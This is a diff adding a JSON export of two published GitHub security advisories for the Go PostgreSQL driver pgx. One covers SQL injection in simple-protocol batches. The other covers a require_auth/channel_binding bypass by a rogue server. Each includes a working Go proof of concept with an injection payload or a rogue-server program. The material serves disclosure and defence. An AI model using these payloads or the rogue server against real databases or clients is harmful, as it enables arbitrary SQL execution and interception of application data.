@@ -1,0 +1,304 @@
+[
+  {
+    "ghsa_id": "GHSA-j38q-h3ph-jjpq",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/jackc/pgx/security-advisories/GHSA-j38q-h3ph-jjpq",
+    "html_url": "https://github.com/jackc/pgx/security/advisories/GHSA-j38q-h3ph-jjpq",
+    "summary": "SQL injection in simple-protocol batches when a queued query ends in a `--` comment",
+    "description": "### Summary\n\nIn simple-protocol mode, `SendBatch` lets an attacker who controls a string argument run arbitrary SQL as the application's database role. pgx pastes each query's arguments into its SQL as quoted literals, then joins the queries with a bare `;`. If a queued query ends in a `--` comment, the next query's first line becomes part of that comment, including the opening quote of its string argument. A newline inside the argument ends the comment, and the rest of the argument runs as SQL. Without an attacker, the next query is silently dropped and `BatchResults.Close()` returns nil.\n\n### Details\n\n`conn.go`, `sendBatchQueryExecModeSimpleProtocol` (https://github.com/jackc/pgx/blob/0dd05bbb034054476833c11856510cc20cbde049/conn.go#L1038-L1058):\r\n\r\n```go\r\nfor i, bi := range b.QueuedQueries {\r\n    if i > 0 {\r\n        sb.WriteByte(';')\r\n    }\r\n    sql, err := c.sanitizeForSimpleQuery(bi.SQL, bi.Arguments...)\r\n    ...\r\n    sb.WriteString(sql)\r\n}\r\nmrr := c.pgConn.Exec(ctx, sb.String())\r\n```\r\n\r\nThe sanitizer quotes each argument correctly within its own query. It can't see that the previous query's trailing `--` comment now runs on into this query. With:\r\n\r\n- query 1: `UPDATE t SET x=x WHERE id=$1 -- note`\r\n- query 2: `INSERT INTO audit(msg) VALUES ($1)`, msg = `\"\\n; CREATE TABLE pwned(); --\"`\r\n\r\nthe server receives:\r\n\r\n```\r\nUPDATE t SET x=x WHERE id= 1  -- note;INSERT INTO audit(msg) VALUES ( '\r\n; CREATE TABLE pwned(); --' )\r\n```\r\n\r\nLine 1 runs the UPDATE and comments out the rest. Line 2 runs `CREATE TABLE pwned()`, and the final `--` comments out the leftover `' )`. The spaces around each value come from the GHSA-m7wr-2xf7-cm9p fix in `internal/sanitize`, and they don't stop this attack.\r\n\r\nThe same code was added in v4 by 25099e6f (\"Permit SendBatch with Simple Protocol\", first released in v4.7.0) and is still there in v5. Extended-protocol modes aren't affected, because they send each query and its parameters separately.\r\n\r\nThe class matches GHSA-m7wr-2xf7-cm9p (line-comment injection in simple protocol), but this is a different code path that the earlier fix didn't cover.\r\n\r\nPossible fix: join with `\";\\n\"` instead of `';'`, so a trailing line comment can't extend into the next query.\n\n### Proof of concept\n\nRequirements: PostgreSQL 14+ (tested on 18) and pgx v5 at `0dd05bbb` (v5.11.0 and earlier behave the same).\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"context\"\r\n\t\"fmt\"\r\n\t\"os\"\r\n\r\n\t\"github.com/jackc/pgx/v5\"\r\n)\r\n\r\nfunc main() {\r\n\tctx := context.Background()\r\n\t// e.g. DATABASE_URL=\"postgres://postgres:pw@127.0.0.1:5432/postgres?sslmode=disable&default_query_exec_mode=simple_protocol\"\r\n\tconn, err := pgx.Connect(ctx, os.Getenv(\"DATABASE_URL\"))\r\n\tif err != nil {\r\n\t\tpanic(err)\r\n\t}\r\n\tdefer conn.Close(ctx)\r\n\r\n\tconn.Exec(ctx, \"DROP TABLE IF EXISTS t, audit, pwned\")\r\n\tconn.Exec(ctx, \"CREATE TABLE t(id int, x int); INSERT INTO t VALUES (1,1); CREATE TABLE audit(msg text)\")\r\n\r\n\tfor _, msg := range []string{\"harmless\", \"\\n; CREATE TABLE pwned(); --\"} {\r\n\t\tb := &pgx.Batch{}\r\n\t\tb.Queue(\"UPDATE t SET x=x WHERE id=$1 -- note\", 1)\r\n\t\tb.Queue(\"INSERT INTO audit(msg) VALUES ($1)\", msg)\r\n\t\tcloseErr := conn.SendBatch(ctx, b).Close()\r\n\r\n\t\tvar rows int\r\n\t\tvar pwned bool\r\n\t\tconn.QueryRow(ctx, \"SELECT count(*) FROM audit\").Scan(&rows)\r\n\t\tconn.QueryRow(ctx, \"SELECT to_regclass('pwned') IS NOT NULL\").Scan(&pwned)\r\n\t\tfmt.Printf(\"msg=%q close=%v audit_rows=%d pwned=%v\\n\", msg, closeErr, rows, pwned)\r\n\t}\r\n}\r\n```\r\n\r\nOutput with `default_query_exec_mode=simple_protocol`:\r\n\r\n```\r\nmsg=\"harmless\" close=<nil> audit_rows=0 pwned=false\r\nmsg=\"\\n; CREATE TABLE pwned(); --\" close=<nil> audit_rows=0 pwned=true\r\n```\r\n\r\nControl: with `default_query_exec_mode=exec` or `cache_statement`, both INSERTs store the row (`audit_rows` = 1, then 2), and `pwned` stays false.\n\n### Impact\n\nSQL injection which affects applications that use pgx batches in simple-protocol mode, which is set through `default_query_exec_mode=simple_protocol` in the connection string or `ConnConfig.DefaultQueryExecMode = pgx.QueryExecModeSimpleProtocol` (also via pgxpool). This mode is common behind PgBouncer in transaction mode. To be exploitable, a queued query must end in a `--` comment with no trailing newline, and the next query must take an attacker-controlled string argument on its first line. When those hold, the attacker runs arbitrary SQL as the application's database role. Even without an attacker, the next query is silently dropped as `Close()` reports no error. Code that reads each result with `br.Exec()` does get `no more results in batch` in that case. But a one-statement payload returns as many results as were queued, so per-result checks don't catch the attack.\r\n",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "jackc",
+      "id": 94130,
+      "node_id": "MDQ6VXNlcjk0MTMw",
+      "avatar_url": "https://avatars.githubusercontent.com/u/94130?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jackc",
+      "html_url": "https://github.com/jackc",
+      "followers_url": "https://api.github.com/users/jackc/followers",
+      "following_url": "https://api.github.com/users/jackc/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jackc/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jackc/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jackc/subscriptions",
+      "organizations_url": "https://api.github.com/users/jackc/orgs",
+      "repos_url": "https://api.github.com/users/jackc/repos",
+      "events_url": "https://api.github.com/users/jackc/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jackc/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-j38q-h3ph-jjpq",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-31T00:54:24Z",
+    "published_at": "2026-10-31T00:54:23Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/jackc/pgx/v5"
+        },
+        "vulnerable_version_range": ">= 5.0.0",
+        "patched_versions": "",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/jackc/pgx/v4"
+        },
+        "vulnerable_version_range": ">= 4.7.0, <= 4.18.3",
+        "patched_versions": "",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-89",
+        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-89"
+    ],
+    "credits": [
+      {
+        "login": "igor-kupczynski",
+        "type": "reporter"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "igor-kupczynski",
+          "id": 166651,
+          "node_id": "MDQ6VXNlcjE2NjY1MQ==",
+          "avatar_url": "https://avatars.githubusercontent.com/u/166651?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/igor-kupczynski",
+          "html_url": "https://github.com/igor-kupczynski",
+          "followers_url": "https://api.github.com/users/igor-kupczynski/followers",
+          "following_url": "https://api.github.com/users/igor-kupczynski/following{/other_user}",
+          "gists_url": "https://api.github.com/users/igor-kupczynski/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/igor-kupczynski/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/igor-kupczynski/subscriptions",
+          "organizations_url": "https://api.github.com/users/igor-kupczynski/orgs",
+          "repos_url": "https://api.github.com/users/igor-kupczynski/repos",
+          "events_url": "https://api.github.com/users/igor-kupczynski/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/igor-kupczynski/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 8.1
+    }
+  },
+  {
+    "ghsa_id": "GHSA-95fj-3fxw-g62g",
+    "cve_id": null,
+    "url": "https://api.github.com/repos/jackc/pgx/security-advisories/GHSA-95fj-3fxw-g62g",
+    "html_url": "https://github.com/jackc/pgx/security/advisories/GHSA-95fj-3fxw-g62g",
+    "summary": "require_auth and channel_binding enforcement is skipped when a server omits AuthenticationOk, allowing a rogue or man-in-the-middle PostgreSQL server to be accepted",
+    "description": "### Summary\r\n\r\npgx supports the libpq-compatible `require_auth` and `channel_binding` connection parameters. These parameters exist to protect a client from a rogue or man-in-the-middle (MITM) PostgreSQL server: `require_auth=scram-sha-256` means the client will only accept the connection if the server completes a SCRAM authentication exchange, and `channel_binding=require` means the client will only accept the connection if the exchange is bound to the TLS channel.\r\n\r\nBoth checks are only applied when the server actually begins an authentication exchange. A malicious server can skip authentication entirely by not sending any `Authentication*` message and sending `ReadyForQuery` directly after the startup phase. In that case neither the `require_auth` policy nor the `channel_binding=require` requirement is evaluated, and the client accepts the connection as fully established. This defeats the only purpose of these two parameters and lets a rogue or MITM server impersonate the real database, read the queries and data the client sends, and return attacker-controlled results.\r\n\r\n### Details\r\n\r\nThe connection startup loop is in `pgconn/pgconn.go`, function `connect`. The loop reads backend messages and dispatches on message type.\r\n\r\nThe `require_auth` policy is enforced in the `AuthenticationOk` branch only:\r\n\r\n```go\r\n// pgconn/pgconn.go\r\ncase *pgproto3.AuthenticationOk:\r\n    if config.SSLCertMode == \"require\" {\r\n        if err := sslCert.checkRequired(); err != nil {\r\n            pgConn.conn.Close()\r\n            return nil, newPerDialConnectError(\"sslcertmode check failed\", err)\r\n        }\r\n    }\r\n    if requireAuthPolicy.authRequired && !clientFinishedAuth {   // <-- the require_auth gate\r\n        return requireAuthFail(requireAuthPolicy.check(authMethodNone))\r\n    }\r\n```\r\n\r\nThe `channel_binding=require` requirement is enforced only inside `scramAuth` (`pgconn/auth_scram.go`, lines 51 to 73), which is reached only from the `AuthenticationSASL` branch.\r\n\r\nThe `ReadyForQuery` branch marks the connection as ready without evaluating either requirement:\r\n\r\n```go\r\n// pgconn/pgconn.go\r\ncase *pgproto3.ReadyForQuery:\r\n    // A server may omit AuthenticationOk, so enforce the requirement here too.\r\n    if config.SSLCertMode == \"require\" {\r\n        if err := sslCert.checkRequired(); err != nil {\r\n            pgConn.conn.Close()\r\n            return nil, newPerDialConnectError(\"sslcertmode check failed\", err)\r\n        }\r\n    }\r\n    // No require_auth check here.\r\n    // No channel_binding check here.\r\n    pgConn.status = connStatusIdle\r\n```\r\n\r\nThe comment on that branch (\"A server may omit AuthenticationOk, so enforce the requirement here too\") shows the maintainers already know a server can reach `ReadyForQuery` without ever sending `AuthenticationOk`. The `sslcertmode=require` check was duplicated onto this path (commit `6470044`, 2026-10-17) precisely for that reason, but the `require_auth` and `channel_binding` checks were not. Because the real policy gate lives on the `AuthenticationOk` path, a server that never sends `AuthenticationOk` is never checked.\r\n\r\nThe intended behavior is documented both by PostgreSQL and by pgx itself:\r\n\r\n- PostgreSQL libpq documentation for `require_auth`: \"If the server does not use the required method to authenticate the client, or if the authentication handshake is not fully completed by the server, the connection will fail.\" For `scram-sha-256`: \"The server must successfully complete a SCRAM-SHA-256 authentication exchange with the client.\"\r\n- pgx `pgconn/require_auth.go`, comment on the `authRequired` field: \"authRequired is true when the server must complete an authentication exchange before sending AuthenticationOk.\" The same file states it \"mirrors libpq's auth_required / allowed_auth_methods bookkeeping.\"\r\n\r\nA server that sends `ReadyForQuery` with no prior `Authentication*` message has not completed any authentication exchange, so per both specifications the connection must fail. pgx accepts it.\r\n\r\nNote on the reference implementation: libpq keeps its connection state machine in `CONNECTION_AWAITING_RESPONSE` until it receives an authentication request, and it rejects a server that jumps straight to post-authentication messages. pgx deliberately tolerates a missing `AuthenticationOk` (which is acceptable for the default, no-`require_auth` case), but in doing so it must still apply an explicitly requested `require_auth` or `channel_binding` policy on that path, and it does not.\r\n\r\nThis is not a test against intentionally vulnerable code. The vulnerable code is pgx's own connection routine. The simulated server in the proof of concept is the adversary that `require_auth` and `channel_binding` are designed to defend against, so it is the correct and intended threat model for these parameters, not a contrived or self-created weak server.\r\n\r\n### Proof of concept\r\n\r\nValidated end to end against the real library at current `master` (commit `d6d4b01`) and against the latest release tag `v5.11.0`, using Go 1.26 on Linux. No PostgreSQL server is involved; the adversary is a short TCP program that speaks just enough of the v3 protocol to reach `ReadyForQuery` without authenticating.\r\n\r\n1. Clone the library and point a throwaway module at it with a replace directive:\r\n\r\n```\r\ngit clone https://github.com/jackc/pgx.git /path/to/pgx\r\nmkdir /path/to/poc && cd /path/to/poc\r\n```\r\n\r\n`/path/to/poc/go.mod`:\r\n\r\n```\r\nmodule poc\r\ngo 1.22\r\nrequire github.com/jackc/pgx/v5 v5.0.0\r\nreplace github.com/jackc/pgx/v5 => /path/to/pgx\r\n```\r\n\r\n2. `/path/to/poc/main.go` (rogue server that skips authentication and a client that demands SCRAM):\r\n\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"context\"\r\n\t\"encoding/binary\"\r\n\t\"fmt\"\r\n\t\"io\"\r\n\t\"net\"\r\n\t\"os\"\r\n\t\"time\"\r\n\r\n\t\"github.com/jackc/pgx/v5/pgconn\"\r\n)\r\n\r\nfunc rogueServer(listener net.Listener) {\r\n\tconn, err := listener.Accept()\r\n\tif err != nil {\r\n\t\treturn\r\n\t}\r\n\tdefer conn.Close()\r\n\r\n\tvar msgLen int32\r\n\tbinary.Read(conn, binary.BigEndian, &msgLen)\r\n\tremaining := make([]byte, msgLen-4)\r\n\tio.ReadFull(conn, remaining)\r\n\tfmt.Println(\"[SERVER] Received startup, skipping auth!\")\r\n\r\n\tsendPS := func(name, value string) {\r\n\t\tpayload := append([]byte(name), 0)\r\n\t\tpayload = append(payload, []byte(value)...)\r\n\t\tpayload = append(payload, 0)\r\n\t\tmsg := make([]byte, 5+len(payload))\r\n\t\tmsg[0] = 'S'\r\n\t\tbinary.BigEndian.PutUint32(msg[1:5], uint32(4+len(payload)))\r\n\t\tcopy(msg[5:], payload)\r\n\t\tconn.Write(msg)\r\n\t}\r\n\tsendPS(\"server_version\", \"17.0\")\r\n\tsendPS(\"server_encoding\", \"UTF8\")\r\n\tsendPS(\"client_encoding\", \"UTF8\")\r\n\r\n\t// BackendKeyData, then ReadyForQuery, with no Authentication* message at all.\r\n\tbkd := make([]byte, 13)\r\n\tbkd[0] = 'K'\r\n\tbinary.BigEndian.PutUint32(bkd[1:5], 12)\r\n\tbinary.BigEndian.PutUint32(bkd[5:9], 1234)\r\n\tbinary.BigEndian.PutUint32(bkd[9:13], 5678)\r\n\tconn.Write(bkd)\r\n\tconn.Write([]byte{'Z', 0, 0, 0, 5, 'I'})\r\n\tfmt.Println(\"[SERVER] Sent ReadyForQuery without auth!\")\r\n\ttime.Sleep(2 * time.Second)\r\n}\r\n\r\nfunc main() {\r\n\tlistener, _ := net.Listen(\"tcp\", \"127.0.0.1:0\")\r\n\taddr := listener.Addr().(*net.TCPAddr)\r\n\tgo rogueServer(listener)\r\n\r\n\tconnString := fmt.Sprintf(\r\n\t\t\"host=127.0.0.1 port=%d user=test password=test dbname=test sslmode=disable require_auth=scram-sha-256\",\r\n\t\taddr.Port)\r\n\r\n\tctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)\r\n\tdefer cancel()\r\n\r\n\tconfig, _ := pgconn.ParseConfig(connString)\r\n\tconn, err := pgconn.ConnectConfig(ctx, config)\r\n\tif err != nil {\r\n\t\tfmt.Printf(\"Connection rejected (SECURE): %v\\n\", err)\r\n\t\tos.Exit(0)\r\n\t}\r\n\tfmt.Printf(\"Connection SUCCEEDED (VULNERABLE)! PID=%d\\n\", conn.PID())\r\n\tconn.Close(ctx)\r\n\tos.Exit(1)\r\n}\r\n```\r\n\r\n3. Run it:\r\n\r\n```\r\ncd /path/to/poc && GOFLAGS=-mod=mod go mod tidy && go run main.go\r\n```\r\n\r\nObserved output (vulnerable):\r\n\r\n```\r\n[SERVER] Received startup, skipping auth!\r\n[SERVER] Sent ReadyForQuery without auth!\r\nConnection SUCCEEDED (VULNERABLE)! PID=1234\r\n```\r\n\r\nThe client was configured with `require_auth=scram-sha-256` and still accepted a server that performed no authentication.\r\n\r\nControl experiment that rules out a false positive: if the same rogue server instead sends a single `AuthenticationOk` message before `ReadyForQuery` (a trust server), the same client correctly rejects the connection with:\r\n\r\n```\r\nrequire_auth check failed: authentication method requirement \"scram-sha-256\" failed: server did not complete authentication\r\n```\r\n\r\nThis proves the `require_auth` gate works, but only on the `AuthenticationOk` path. Skipping that message is what bypasses it. The following variants were also confirmed with the same rogue (no-auth) server:\r\n\r\n- `require_auth=password`: accepted (bypass).\r\n- `channel_binding=require`: accepted (bypass; same root cause, the SCRAM path is never entered).\r\n- no `require_auth`: accepted (correct and expected, since the default permits a server to skip authentication).\r\n\r\n### Impact\r\n\r\nThis is a client-side authentication-enforcement bypass. It affects any application that uses pgx (directly, or through `database/sql`, `pgxpool`, or higher layers built on pgconn) and relies on `require_auth` or `channel_binding=require` to protect itself against a rogue or MITM database server.\r\n\r\nAn attacker who can make a pgx client reach the attacker's endpoint (by operating a rogue server the client is pointed at, by DNS or routing manipulation, or by an on-path MITM position) can:\r\n\r\n- Be accepted as the database server despite the client's explicit `require_auth` or `channel_binding=require` requirement.\r\n- Read every query and bind parameter the client subsequently sends, which commonly contain sensitive application data.\r\n- Return attacker-chosen result sets, which the application trusts and acts on.\r\n\r\nThe attacker does not need any privileges on the client host and no user interaction is required. The client's stored database password is not directly disclosed by this specific bypass, because the rogue server never requests it; the exposure is the confidentiality of the data the client sends in queries and the integrity of the results it receives, together with the loss of the server-authentication guarantee the parameters are meant to provide.",
+    "severity": "high",
+    "author": null,
+    "publisher": {
+      "login": "jackc",
+      "id": 94130,
+      "node_id": "MDQ6VXNlcjk0MTMw",
+      "avatar_url": "https://avatars.githubusercontent.com/u/94130?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/jackc",
+      "html_url": "https://github.com/jackc",
+      "followers_url": "https://api.github.com/users/jackc/followers",
+      "following_url": "https://api.github.com/users/jackc/following{/other_user}",
+      "gists_url": "https://api.github.com/users/jackc/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/jackc/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/jackc/subscriptions",
+      "organizations_url": "https://api.github.com/users/jackc/orgs",
+      "repos_url": "https://api.github.com/users/jackc/repos",
+      "events_url": "https://api.github.com/users/jackc/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/jackc/received_events",
+      "type": "User",
+      "user_view_type": "public",
+      "site_admin": false
+    },
+    "identifiers": [
+      {
+        "value": "GHSA-95fj-3fxw-g62g",
+        "type": "GHSA"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-10-31T00:55:56Z",
+    "published_at": "2026-10-31T00:55:55Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "submission": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/jackc/pgx/v5"
+        },
+        "vulnerable_version_range": ">= 5.9.0",
+        "patched_versions": "",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": null
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-287",
+        "name": "Improper Authentication"
+      },
+      {
+        "cwe_id": "CWE-304",
+        "name": "Missing Critical Step in Authentication"
+      }
+    ],
+    "cwe_ids": [
+      "CWE-287",
+      "CWE-304"
+    ],
+    "credits": [
+      {
+        "login": "president-xd",
+        "type": "reporter"
+      },
+      {
+        "login": "hash3liZer",
+        "type": "analyst"
+      },
+      {
+        "login": "eros938",
+        "type": "analyst"
+      }
+    ],
+    "credits_detailed": [
+      {
+        "user": {
+          "login": "president-xd",
+          "id": 160683327,
+          "node_id": "U_kgDOCZPVPw",
+          "avatar_url": "https://avatars.githubusercontent.com/u/160683327?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/president-xd",
+          "html_url": "https://github.com/president-xd",
+          "followers_url": "https://api.github.com/users/president-xd/followers",
+          "following_url": "https://api.github.com/users/president-xd/following{/other_user}",
+          "gists_url": "https://api.github.com/users/president-xd/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/president-xd/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/president-xd/subscriptions",
+          "organizations_url": "https://api.github.com/users/president-xd/orgs",
+          "repos_url": "https://api.github.com/users/president-xd/repos",
+          "events_url": "https://api.github.com/users/president-xd/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/president-xd/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "hash3liZer",
+          "id": 29171692,
+          "node_id": "MDQ6VXNlcjI5MTcxNjky",
+          "avatar_url": "https://avatars.githubusercontent.com/u/29171692?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/hash3liZer",
+          "html_url": "https://github.com/hash3liZer",
+          "followers_url": "https://api.github.com/users/hash3liZer/followers",
+          "following_url": "https://api.github.com/users/hash3liZer/following{/other_user}",
+          "gists_url": "https://api.github.com/users/hash3liZer/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/hash3liZer/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/hash3liZer/subscriptions",
+          "organizations_url": "https://api.github.com/users/hash3liZer/orgs",
+          "repos_url": "https://api.github.com/users/hash3liZer/repos",
+          "events_url": "https://api.github.com/users/hash3liZer/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/hash3liZer/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst",
+        "state": "accepted"
+      },
+      {
+        "user": {
+          "login": "eros938",
+          "id": 150992485,
+          "node_id": "U_kgDOCP_2ZQ",
+          "avatar_url": "https://avatars.githubusercontent.com/u/150992485?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/eros938",
+          "html_url": "https://github.com/eros938",
+          "followers_url": "https://api.github.com/users/eros938/followers",
+          "following_url": "https://api.github.com/users/eros938/following{/other_user}",
+          "gists_url": "https://api.github.com/users/eros938/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/eros938/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/eros938/subscriptions",
+          "organizations_url": "https://api.github.com/users/eros938/orgs",
+          "repos_url": "https://api.github.com/users/eros938/repos",
+          "events_url": "https://api.github.com/users/eros938/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/eros938/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst",
+        "state": "accepted"
+      }
+    ],
+    "collaborating_users": null,
+    "collaborating_teams": null,
+    "private_fork": null,
+    "comments": 1,
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  }
+]
